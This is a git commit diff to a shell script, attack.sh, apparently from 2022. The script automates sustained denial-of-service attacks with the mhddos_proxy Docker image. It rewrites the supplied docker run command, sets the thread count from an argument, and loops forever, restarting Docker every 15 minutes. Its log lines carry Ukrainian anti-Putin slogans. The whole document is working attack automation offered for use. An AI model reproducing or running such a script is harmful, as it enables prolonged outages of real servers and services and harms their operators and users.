b9307c30c5c5c1998a53ef0a6a4b8607e43d78f0
va1d3mar <Valdemarius666@protonmail.com>
2022-04-12 14:32:12 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,7 +1,19 @@
-echo "--==" "$(date "+%d.%m.%Y %H:%M:%S")" "==--" "Starting attack. Putin, go to HELL!!!" >> /var/log/attack.log
+clear
+logfile="/var/log/attack.log"
+command=$1
+parameter=$2
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
+echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Надана команда:" "$1" >> $logfile
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $logfile
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
+command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
+command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
+command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
 while true 
 do
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Starting sequence" >> /var/log/attack.log & $1 & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Sequence active, working for 15 minutes" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Restarting after 15 minutes of work" >> /var/log/attack.log && systemctl restart docker
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "DOCKER restarted. Waiting 5 secounds for new sequence" >> /var/log/resting.log
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & $command & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
 sleep 5
 done
